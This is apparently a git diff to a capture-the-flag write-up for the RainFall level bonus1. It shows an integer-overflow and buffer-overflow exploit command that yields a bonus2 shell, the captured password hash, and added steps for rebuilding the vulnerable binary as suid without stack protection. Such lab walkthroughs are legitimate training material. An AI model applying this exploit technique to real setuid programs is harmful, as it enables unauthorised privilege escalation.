@@ -65,9 +65,9 @@ n = -2147483637, n * 4 = 44
 
 ### Build overflow string
 
-So our first arg ```n``` is ```-2147483637```
+So our first argument ```n``` is ```-2147483637```
 
-And our secong arg:
+And our second argument:
 1. 40 bytes padding to reach the address of ```n``` - ```$(python -c 'print "A" * 40'```
 2. target value ```n``` to open shell, 0x574f4c46 = "FLOW" in ascii - ```"FLOW"```
 ```
@@ -76,4 +76,25 @@ $ whoami
 bonus2
 $ cat /home/user/bonus2/.pass
 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+```
+
+## Recreate Exploited Binary
+
+As user ```bonus2```, in ```/tmp```, create and compile ```bonus1_source.c```
+```
+bonus2@RainFall:/tmp$ gcc bonus1_source.c -fno-stack-protector -o bonus1_source
+```
+
+Edit permissions including suid, then move the binary to home directory.
+```
+bonus2@RainFall:/tmp$ chmod u+s bonus1_source; chmod +wx ~; mv bonus1_source ~
+```
+
+Exit back to user ```bonus1```, then provide our exploit arguments to the source.
+```
+bonus2@RainFall:/tmp$ exit
+exit
+bonus1@RainFall:~$ /home/user/bonus2/bonus1_source -2147483637 $(python -c 'print "A" * 40 + "FLOW"')
+$ whoami
+bonus2
 ```
